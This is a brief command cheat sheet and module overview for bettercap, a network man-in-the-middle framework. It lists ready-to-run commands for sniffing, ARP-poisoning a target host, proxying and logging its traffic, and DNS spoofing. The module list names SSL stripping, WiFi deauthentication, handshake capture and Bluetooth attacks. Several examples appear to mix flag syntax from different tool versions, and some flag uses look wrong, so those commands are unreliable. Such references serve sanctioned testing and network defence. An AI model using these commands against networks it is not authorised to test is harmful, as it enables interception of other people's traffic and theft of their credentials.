Examples

Start sniffer on interface

bettercap -I eth0 -X

ARP spoof target with sniffer

bettercap -I eth0 -T 192.168.1.100 -X --spoof

MITM with proxy and logging

bettercap -I eth0 -T 192.168.1.100 -G 192.168.1.1 -P --proxy -L cap.log

Run a caplet script

bettercap -I eth0 --caplet /path/to/caplet.cap

Evaluate commands inline

bettercap -eval "net.sniff on; set arp.spoof.targets 192.168.1.100; arp.spoof on"

Sniffer with DNS spoofing

bettercap -I eth0 -X --dns example.com=10.0.0.1

Capture output to file

bettercap -I eth0 -X -O /tmp/capture

Disable HTTP/HTTPS servers

bettercap -I eth0 -X --no-http --no-https

Documentation

Bettercap — MITM Framework

Bettercap is a powerful, modular, and portable MITM framework capable of attacking WiFi, Bluetooth Low Energy, and wired networks. It features an interactive console with real-time monitoring.

Key Modules

  • net.sniff: Passive network sniffer
  • arp.spoof: ARP poisoning for MITM
  • dns.spoof: DNS response spoofing
  • http.proxy: HTTP/HTTPS proxy with SSL stripping
  • wifi: WiFi monitoring, deauth, and WPA handshake capture
  • ble: Bluetooth Low Energy attacks
